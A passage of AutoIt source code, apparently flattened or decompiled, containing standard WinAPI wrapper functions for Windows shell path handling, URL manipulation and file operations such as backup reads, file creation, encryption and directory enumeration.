    Local $acall = DllCall("shlwapi.dll", "ptr", "PathGetArgsW", "struct*", $tpath)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return _WinAPI_GetString($acall[0x0])
EndFunc   ;==>_WINAPI_PATHGETARGS
Func _WinAPI_PathGetCharType($schar)
    Local $acall = DllCall("shlwapi.dll", "uint", "PathGetCharTypeW", "word", AscW($schar))
    If @error Then Return SetError(@error, @extended, +0xffffffff)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHGETCHARTYPE
Func _WinAPI_PathGetDriveNumber($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "int", "PathGetDriveNumberW", "wstr", $sfilepath)
    If @error Or ($acall[0x0] = +0xffffffff) Then Return SetError(@error, @extended, "")
    Return Chr($acall[0x0] + 0x41) & ":"
EndFunc   ;==>_WINAPI_PATHGETDRIVENUMBER
Func _WinAPI_PathIsContentType($sfilepath, $stype)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsContentTypeW", "wstr", $sfilepath, "wstr", $stype)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISCONTENTTYPE
Func _WinAPI_PathIsExe($sfilepath)
    Local $acall = DllCall("shell32.dll", "bool", "PathIsExe", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISEXE
Func _WinAPI_PathIsFileSpec($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsFileSpecW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISFILESPEC
Func _WinAPI_PathIsLFNFileSpec($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsLFNFileSpecW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISLFNFILESPEC
Func _WinAPI_PathIsRelative($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsRelativeW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISRELATIVE
Func _WinAPI_PathIsRoot($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsRootW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISROOT
Func _WinAPI_PathIsSameRoot($spath1, $spath2)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsSameRootW", "wstr", $spath1, "wstr", $spath2)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISSAMEROOT
Func _WinAPI_PathIsSystemFolder($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsSystemFolderW", "wstr", $sfilepath, "dword", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISSYSTEMFOLDER
Func _WinAPI_PathIsUNC($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsUNCW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISUNC
Func _WinAPI_PathIsUNCServer($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsUNCServerW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISUNCSERVER
Func _WinAPI_PathIsUNCServerShare($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsUNCServerShareW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISUNCSERVERSHARE
Func _WinAPI_PathMakeSystemFolder($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathMakeSystemFolderW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHMAKESYSTEMFOLDER
Func _WinAPI_PathMatchSpec($sfilepath, $sspec)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathMatchSpecW", "wstr", $sfilepath, "wstr", $sspec)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHMATCHSPEC
Func _WinAPI_PathParseIconLocation($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "int", "PathParseIconLocationW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, 0x0)
    Local $aret[0x2]
    $aret[0x0] = $acall[0x1]
    $aret[0x1] = $acall[0x0]
    Return $aret
EndFunc   ;==>_WINAPI_PATHPARSEICONLOCATION
Func _WinAPI_PathRelativePathTo($spathfrom, $bdirfrom, $spathto, $bdirto)
    If $bdirfrom Then
        $bdirfrom = 0x10
    EndIf
    If $bdirto Then
        $bdirto = 0x10
    EndIf
    Local $acall = DllCall("shlwapi.dll", "bool", "PathRelativePathToW", "wstr", "", "wstr", $spathfrom, "dword", $bdirfrom, "wstr", $spathto, "dword", $bdirto)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHRELATIVEPATHTO
Func _WinAPI_PathRemoveArgs($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "none", "PathRemoveArgsW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHREMOVEARGS
Func _WinAPI_PathRemoveBackslash($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "ptr", "PathRemoveBackslashW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHREMOVEBACKSLASH
Func _WinAPI_PathRemoveExtension($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "none", "PathRemoveExtensionW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHREMOVEEXTENSION
Func _WinAPI_PathRemoveFileSpec($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathRemoveFileSpecW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return SetExtended($acall[0x0], $acall[0x1])
EndFunc   ;==>_WINAPI_PATHREMOVEFILESPEC
Func _WinAPI_PathRenameExtension($sfilepath, $sext)
    Local $tpath = DllStructCreate("wchar[260]")
    DllStructSetData($tpath, 0x1, $sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathRenameExtensionW", "struct*", $tpath, "wstr", $sext)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return DllStructGetData($tpath, 0x1)
EndFunc   ;==>_WINAPI_PATHRENAMEEXTENSION
Func _WinAPI_PathSearchAndQualify($sfilepath, $bexists = False)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathSearchAndQualifyW", "wstr", $sfilepath, "wstr", "", "int", 0x1000)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    If $bexists And Not FileExists($acall[0x2]) Then Return SetError(0x14, 0x0, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_PATHSEARCHANDQUALIFY
Func _WinAPI_PathSkipRoot($sfilepath)
    Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 0x1) & "]")
    DllStructSetData($tpath, 0x1, $sfilepath)
    Local $acall = DllCall("shlwapi.dll", "ptr", "PathSkipRootW", "struct*", $tpath)
    If @error Then Return SetError(@error, @extended, "")
    If Not $acall[0x0] Then Return $sfilepath
    Return _WinAPI_GetString($acall[0x0])
EndFunc   ;==>_WINAPI_PATHSKIPROOT
Func _WinAPI_PathStripPath($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "none", "PathStripPathW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHSTRIPPATH
Func _WinAPI_PathStripToRoot($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathStripToRootW", "wstr", $sfilepath)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHSTRIPTOROOT
Func _WinAPI_PathUndecorate($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "none", "PathUndecorateW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHUNDECORATE
Func _WinAPI_PathUnExpandEnvStrings($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathUnExpandEnvStringsW", "wstr", $sfilepath, "wstr", "", "uint", 0x1000)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_PATHUNEXPANDENVSTRINGS
Func _WinAPI_PathUnmakeSystemFolder($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathUnmakeSystemFolderW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHUNMAKESYSTEMFOLDER
Func _WinAPI_PathUnquoteSpaces($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "none", "PathUnquoteSpacesW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHUNQUOTESPACES
Func _WinAPI_PathYetAnotherMakeUniqueName($sfilepath)
    Local $acall = DllCall("shell32.dll", "int", "PathYetAnotherMakeUniqueName", "wstr", "", "wstr", $sfilepath, "ptr", 0x0, "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHYETANOTHERMAKEUNIQUENAME
Func _WinAPI_ShellGetImageList($bsmall = False)
    Local $plarge, $psmall, $tptr = DllStructCreate("ptr")
    If $bsmall Then
        $plarge = 0x0
        $psmall = DllStructGetPtr($tptr)
    Else
        $plarge = DllStructGetPtr($tptr)
        $psmall = 0x0
    EndIf
    Local $acall = DllCall("shell32.dll", "int", "Shell_GetImageLists", "ptr", $plarge, "ptr", $psmall)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
    Return DllStructGetData($tptr, 0x1)
EndFunc   ;==>_WINAPI_SHELLGETIMAGELIST
Func _WinAPI_UrlApplyScheme($surl, $iflags = 0x1)
    Local $acall = DllCall("shlwapi.dll", "long", "UrlApplySchemeW", "wstr", $surl, "wstr", "", "dword*", 0x1000, "dword", $iflags)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_URLAPPLYSCHEME
Func _WinAPI_UrlCanonicalize($surl, $iflags)
    Local $acall = DllCall("shlwapi.dll", "long", "UrlCanonicalizeW", "wstr", $surl, "wstr", "", "dword*", 0x1000, "dword", $iflags)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_URLCANONICALIZE
Func _WinAPI_UrlCombine($surl, $spart, $iflags = 0x0)
    Local $acall = DllCall("shlwapi.dll", "long", "UrlCombineW", "wstr", $surl, "wstr", $spart, "wstr", "", "dword*", 0x1000, "dword", $iflags)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x3]
EndFunc   ;==>_WINAPI_URLCOMBINE
Func _WinAPI_UrlCompare($surl1, $surl2, $bignoreslash = False)
    Local $acall = DllCall("shlwapi.dll", "int", "UrlCompareW", "wstr", $surl1, "wstr", $surl2, "bool", $bignoreslash)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_URLCOMPARE
Func _WinAPI_UrlCreateFromPath($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "long", "UrlCreateFromPathW", "wstr", $sfilepath, "wstr", "", "dword*", 0x1000, "dword", 0x0)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] < 0x0 Or $acall[0x0] > 0x1 Then
        Return SetError(0xa, $acall[0x0], "")
    EndIf
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_URLCREATEFROMPATH
Func _WinAPI_UrlFixup($surl)
    Local $acall = DllCall("shlwapi.dll", "long", "UrlFixupW", "wstr", $surl, "wstr", "", "dword", 0x1000)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_URLFIXUP
Func _WinAPI_UrlGetPart($surl, $ipart)
    Local $acall = DllCall("shlwapi.dll", "long", "UrlGetPartW", "wstr", $surl, "wstr", "", "dword*", 0x1000, "dword", $ipart, "dword", 0x0)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_URLGETPART
Func _WinAPI_UrlHash($surl, $ilength = 0x20)
    If $ilength <= 0x0 Or $ilength > 0x100 Then Return SetError(0x100, 0x0, 0x0)
    Local $tdata = DllStructCreate("byte[" & $ilength & "]")
    Local $acall = DllCall("shlwapi.dll", "long", "UrlHashW", "wstr", $surl, "struct*", $tdata, "dword", $ilength)
    If @error Then Return SetError(@error + 0xa, @extended, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Return DllStructGetData($tdata, 0x1)
EndFunc   ;==>_WINAPI_URLHASH
Func _WinAPI_UrlIs($surl, $itype = 0x0)
    Local $acall = DllCall("shlwapi.dll", "bool", "UrlIsW", "wstr", $surl, "uint", $itype)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_URLIS
#EndRegion Public Functions
#Region Internal Functions
Func __US($sstring, $ilength = 0x0)
    If $ilength Then
        $sstring = StringLeft($sstring, $ilength)
    Else
        $ilength = StringLen($sstring)
    EndIf
    Local $tus = DllStructCreate("ushort;ushort;ptr;wchar[" & ($ilength + 0x1) & "]")
    DllStructSetData($tus, 0x1, 0x2 * StringLen($sstring))
    DllStructSetData($tus, 0x2, 0x2 * $ilength)
    DllStructSetData($tus, 0x3, DllStructGetPtr($tus, 0x4))
    DllStructSetData($tus, 0x4, $sstring)
    Return $tus
EndFunc   ;==>__US
#EndRegion Internal Functions
#Region Global Variables and Constants
Global $__g_iheapsize = 0x800000
Global Const $tagfileinfo = "uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;uint64 ChangeTime;dword Attributes"
Global Const $tagfile_id_descriptor = "dword Size;uint Type;" & $tagguid
Global Const $tagwin32_find_stream_data = "int64 StreamSize;wchar StreamName[296]"
Global Const $tagwin32_stream_id = "dword StreamId;dword StreamAttributes;int64 Size;dword StreamNameSize;wchar StreamName[1]"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
Func _WinAPI_BackupRead($hfile, $pbuffer, $ilength, ByRef $ibytes, ByRef $pcontext, $bsecurity = False)
    $ibytes = 0x0
    Local $acall = DllCall("kernel32.dll", "bool", "BackupRead", "handle", $hfile, "struct*", $pbuffer, "dword", $ilength, "dword*", 0x0, "bool", 0x0, "bool", $bsecurity, "ptr*", $pcontext)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
    $ibytes = $acall[0x4]
    $pcontext = $acall[0x7]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_BACKUPREAD
Func _WinAPI_BackupReadAbort(ByRef $pcontext)
    Local $acall = DllCall("kernel32.dll", "bool", "BackupRead", "handle", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "bool", 0x1, "bool", 0x0, "ptr*", $pcontext)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
    $pcontext = $acall[0x7]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_BACKUPREADABORT
Func _WinAPI_BackupSeek($hfile, $iseek, ByRef $ibytes, ByRef $pcontext)
    $ibytes = 0x0
    Local $acall = DllCall("kernel32.dll", "bool", "BackupSeek", "handle", $hfile, "dword", _WinAPI_LoDWord($iseek), "dword", _WinAPI_HiDWord($iseek), "dword*", 0x0, "dword*", 0x0, "ptr*", $pcontext)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
    $ibytes = __WINAPI_MAKEQWORD($acall[0x4], $acall[0x5])
    $pcontext = $acall[0x6]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_BACKUPSEEK
Func _WinAPI_BackupWrite($hfile, $pbuffer, $ilength, ByRef $ibytes, ByRef $pcontext, $bsecurity = False)
    $ibytes = 0x0
    Local $acall = DllCall("kernel32.dll", "bool", "BackupWrite", "handle", $hfile, "struct*", $pbuffer, "dword", $ilength, "dword*", 0x0, "bool", 0x0, "bool", $bsecurity, "ptr*", $pcontext)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
    $ibytes = $acall[0x4]
    $pcontext = $acall[0x7]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_BACKUPWRITE
Func _WinAPI_BackupWriteAbort(ByRef $pcontext)
    Local $acall = DllCall("kernel32.dll", "bool", "BackupWrite", "handle", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "bool", 0x1, "bool", 0x0, "ptr*", $pcontext)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
    $pcontext = $acall[0x7]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_BACKUPWRITEABORT
Func _WinAPI_CopyFileEx($sexistingfile, $snewfile, $iflags = 0x0, $pprogressproc = 0x0, $pdata = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "CopyFileExW", "wstr", $sexistingfile, "wstr", $snewfile, "ptr", $pprogressproc, "struct*", $pdata, "bool*", 0x0, "dword", $iflags)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_COPYFILEEX
Func _WinAPI_CreateDirectory($sdir, $tsecurity = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "CreateDirectoryW", "wstr", $sdir, "struct*", $tsecurity)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_CREATEDIRECTORY
Func _WinAPI_CreateDirectoryEx($snewdir, $stemplatedir, $tsecurity = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "CreateDirectoryExW", "wstr", $stemplatedir, "wstr", $snewdir, "struct*", $tsecurity)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_CREATEDIRECTORYEX
Func _WinAPI_CreateFileEx($sfilepath, $icreation, $iaccess = 0x0, $ishare = 0x0, $iflagsandattributes = 0x0, $tsecurity = 0x0, $htemplate = 0x0)
    Local $acall = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilepath, "dword", $iaccess, "dword", $ishare, "struct*", $tsecurity, "dword", $icreation, "dword", $iflagsandattributes, "handle", $htemplate)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] = Ptr(+0xffffffff) Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_CREATEFILEEX
Func _WinAPI_CreateFileMapping($hfile, $isize = 0x0, $sname = "", $iprotect = 0x4, $tsecurity = 0x0)
    If Not StringStripWS($sname, $str_stripleading + $str_striptrailing) Then $sname = Null
    Local $acall = DllCall("kernel32.dll", "handle", "CreateFileMappingW", "handle", $hfile, "struct*", $tsecurity, "dword", $iprotect, "dword", _WinAPI_HiDWord($isize), "dword", _WinAPI_LoDWord($isize), "wstr", $sname)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return SetExtended(_WinAPI_GetLastError(), $acall[0x0])
EndFunc   ;==>_WINAPI_CREATEFILEMAPPING
Func _WinAPI_CreateHardLink($snewfile, $sexistingfile)
    Local $acall = DllCall("kernel32.dll", "bool", "CreateHardLinkW", "wstr", $snewfile, "wstr", $sexistingfile, "ptr", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_CREATEHARDLINK
Func _WinAPI_CreateObjectID($sfilepath)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, 0x0, $file_share_readwrite, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $tfoid = DllStructCreate("byte[16];byte[48]")
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x900c0, "ptr", 0x0, "dword", 0x0, "struct*", $tfoid, "dword", DllStructGetSize($tfoid), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Local $tguid = DllStructCreate($tagguid)
    _WinAPI_MoveMemory($tguid, $tfoid, 0x10)
    Return $tguid
EndFunc   ;==>_WINAPI_CREATEOBJECTID
Func _WinAPI_CreateSymbolicLink($ssymlink, $starget, $bdirectory = False)
    If $bdirectory Then
        $bdirectory = 0x1
    EndIf
    Local $acall = DllCall("kernel32.dll", "boolean", "CreateSymbolicLinkW", "wstr", $ssymlink, "wstr", $starget, "dword", $bdirectory)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_CREATESYMBOLICLINK
Func _WinAPI_DecryptFile($sfilepath)
    Local $acall = DllCall("advapi32.dll", "bool", "DecryptFileW", "wstr", $sfilepath, "dword", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_DECRYPTFILE
Func _WinAPI_DefineDosDevice($sdevice, $iflags, $sfilepath = "")
    If Not StringStripWS($sfilepath, $str_stripleading + $str_striptrailing) Then $sfilepath = Null
    Local $acall = DllCall("kernel32.dll", "bool", "DefineDosDeviceW", "dword", $iflags, "wstr", $sdevice, "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_DEFINEDOSDEVICE
Func _WinAPI_DeleteFile($sfilepath)
    Local $acall = DllCall("kernel32.dll", "bool", "DeleteFileW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_DELETEFILE
Func _WinAPI_DeleteObjectID($sfilepath)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, $generic_write, $file_share_readwrite, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x900a0, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_DELETEOBJECTID
Func _WinAPI_DeleteVolumeMountPoint($smountedpath)
    Local $acall = DllCall("kernel32.dll", "bool", "DeleteVolumeMountPointW", "wstr", $smountedpath)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_DELETEVOLUMEMOUNTPOINT
Func _WinAPI_DeviceIoControl($hdevice, $icontrolcode, $pinbuffer = 0x0, $iinbuffersize = 0x0, $poutbuffer = 0x0, $ioutbuffersize = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hdevice, "dword", $icontrolcode, "struct*", $pinbuffer, "dword", $iinbuffersize, "struct*", $poutbuffer, "dword", $ioutbuffersize, "dword*", 0x0, "ptr", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    Return SetExtended($acall[0x7], $acall[0x0])
EndFunc   ;==>_WINAPI_DEVICEIOCONTROL
Func _WinAPI_DuplicateEncryptionInfoFile($ssrcfilepath, $sdestfilepath, $icreation = 0x2, $iattributes = 0x0, $tsecurity = 0x0)
    Local $acall = DllCall("advapi32.dll", "dword", "DuplicateEncryptionInfoFile", "wstr", $ssrcfilepath, "wstr", $sdestfilepath, "dword", $icreation, "dword", $iattributes, "struct*", $tsecurity)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_DUPLICATEENCRYPTIONINFOFILE
Func _WinAPI_EjectMedia($sdrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, $generic_read, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d4808, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_EJECTMEDIA
Func _WinAPI_EncryptFile($sfilepath)
    Local $acall = DllCall("advapi32.dll", "bool", "EncryptFileW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ENCRYPTFILE
Func _WinAPI_EncryptionDisable($sdir, $bdisable)
    Local $acall = DllCall("advapi32.dll", "bool", "EncryptionDisable", "wstr", $sdir, "bool", $bdisable)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ENCRYPTIONDISABLE
Func _WinAPI_EnumFiles($sdir, $iflag = 0x0, $stemplate = "", $bexclude = False)
    Local $acall, $ierror = 0x0
    Local $adata[0x1f5][0x7] = [[0x0]]
    Local $hdir = _WinAPI_CreateFileEx($sdir, $open_existing, 0x1, $file_share_any, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $pbuffer = __HEAPALLOC($__g_iheapsize)
    If @error Then
        $ierror = @error
    Else
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        $acall = DllCall("ntdll.dll", "uint", "ZwQueryDirectoryFile", "handle", $hdir, "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "struct*", $tiosb, "struct*", $pbuffer, "ulong", 0x800000, "uint", 0x1, "boolean", 0x0, "ptr", 0x0, "boolean", 0x1)
        If @error Or $acall[0x0] Then
            $ierror = @error + 0x28
        EndIf
    EndIf
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hdir)
    If $ierror Then
        __HEAPFREE($pbuffer, 0x1)
        If IsArray($acall) Then
            Return SetError(0xa, $acall[0x0], 0x0)
        Else
            Return SetError($ierror, 0x0, 0x0)
        EndIf
    EndIf
    Local $tfdi, $iattrib, $starget, $ilength = 0x0, $ioffset = 0x0
    Do
        $ilength += $ioffset
        $tfdi = DllStructCreate("ulong;ulong;int64;int64;int64;int64;int64;int64;ulong;ulong;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pbuffer + $ilength + 0x3c), 0x1) / 0x2) & "]", $pbuffer + $ilength)
        $starget = DllStructGetData($tfdi, 0xb)
        $iattrib = DllStructGetData($tfdi, 0x9)
        $ioffset = DllStructGetData($tfdi, 0x1)
        Switch $starget
            Case ".", ".."
                ContinueLoop
            Case Else
                Switch $iflag
                    Case 0x1, 0x2
                        If BitAND($iattrib, 0x10) Then
                            If $iflag = 0x1 Then
                                ContinueLoop
                            EndIf
                        Else
                            If $iflag = 0x2 Then
                                ContinueLoop
                            EndIf
                        EndIf
                EndSwitch
                If $stemplate Then
                    $acall = DllCall("shlwapi.dll", "int", "PathMatchSpecW", "wstr", $starget, "wstr", $stemplate)
                    If @error Or ($acall[0x0] And $bexclude) Or (Not $acall[0x0] And Not $bexclude) Then
                        ContinueLoop
                    EndIf
                EndIf
        EndSwitch
        __INC($adata, 0x1f4)
        $adata[$adata[0x0][0x0]][0x0] = $starget
        $adata[$adata[0x0][0x0]][0x1] = DllStructGetData($tfdi, 0x3)
        $adata[$adata[0x0][0x0]][0x2] = DllStructGetData($tfdi, 0x4)
        $adata[$adata[0x0][0x0]][0x3] = DllStructGetData($tfdi, 0x5)
        $adata[$adata[0x0][0x0]][0x4] = DllStructGetData($tfdi, 0x7)
        $adata[$adata[0x0][0x0]][0x5] = DllStructGetData($tfdi, 0x8)
        $adata[$adata[0x0][0x0]][0x6] = $iattrib
    Until Not $ioffset
    __HEAPFREE($pbuffer)
    __INC($adata, +0xffffffff)
    Return $adata
EndFunc   ;==>_WINAPI_ENUMFILES
Func _WinAPI_EnumFileStreams($sfilepath)
    Local $tdata = DllStructCreate("byte[32768]")
    Local $pdata = DllStructGetPtr($tdata)
    Local $adata[0x65][0x2] = [[0x0]]
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, 0x0, $file_share_readwrite, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $ierror = 0x0
    Local $tiosb = DllStructCreate("ptr;ulong_ptr")
